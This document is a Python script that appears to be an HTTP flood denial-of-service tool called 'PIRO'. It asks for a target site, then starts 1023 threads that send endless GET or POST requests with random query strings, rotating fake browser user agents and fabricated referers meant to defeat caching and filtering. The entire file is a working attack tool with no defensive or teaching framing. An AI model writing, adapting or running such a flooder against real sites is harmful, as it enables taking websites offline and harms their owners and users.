import random
import string
import threading
import time
import requests
import argparse
import os
import signal
from rich.console import Console
from rich.progress import Progress

user_agents = [
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
]

headers_referers = [
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",    
]
accept_charset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

threads = []
cur_threads = 0
max_threads = 1023

console = Console()

def httpcall(url, url_host, data, custom_headers):
    global cur_threads

    param_joiner = "&" if "?" in url else "?"

    while True:
        params = "".join(random.choice(string.ascii_letters) for _ in range(random.randint(3, 10)))

        headers = {
            "User-Agent": random.choice(user_agents),
            "Cache-Control": "no-cache",
            "Accept-Charset": accept_charset,
            "Referer": random.choice(headers_referers) + "".join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 10))),
            "Keep-Alive": str(random.randint(100, 500)),
            "Connection": "keep-alive",
            "Host": url_host
        }

        # Add custom headers
        headers.update(custom_headers)

        try:
            if data:
                requests.post(url, data=data, headers=headers)
            else:
                requests.get(url + param_joiner + params + "=" + params, headers=headers)

        except (requests.exceptions.RequestException, requests.exceptions.Timeout):
            cur_threads -= 1
            console.print(f"[red]Error: Connection Timeout[/red]")
        else:
            cur_threads += 1
            console.print(f"[cyan]Requests Sent: {cur_threads}[/cyan]", end='\r', style='bold')

def run():
    try:
        console.print("[bold blue]-- PIRO Attack Started --[/bold blue]")
        url = input("Enter the destination site (e.g., http://example.com): ")
        data = input("Enter data to POST (press Enter for GET requests): ")
        custom_headers_input = input("Enter custom headers (format: 'MyHeader: 123', press Enter if none): ")

        custom_headers = dict(header.split(":") for header in custom_headers_input.split(",") if custom_headers_input) if custom_headers_input else {}

        console.print("[bold green]Go![/bold green]")

        def signal_handler(sig, frame):
            try:
                console.print("\n[red]-- Interrupted by user --[/red]")
                os._exit(0)
                for thread in threads:
                    thread.join()
                os._exit(0)
            except KeyboardInterrupt:
                console.print("\n[red]-- Interrupted by user --[/red]")

        signal.signal(signal.SIGINT, signal_handler)

        with Progress() as progress:
            task = progress.add_task("[cyan]Attacking...", total=max_threads)
            for _ in range(max_threads):
                thread = threading.Thread(target=httpcall, args=(url, url, data, custom_headers))
                threads.append(thread)
                thread.start()
                progress.advance(task)

            while not progress.finished:
                time.sleep(1)

    except KeyboardInterrupt:
        console.print("\n[red]-- Interrupted by user --[/red]")

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        console.print("\n[red]-- Interrupted by user --[/red]")
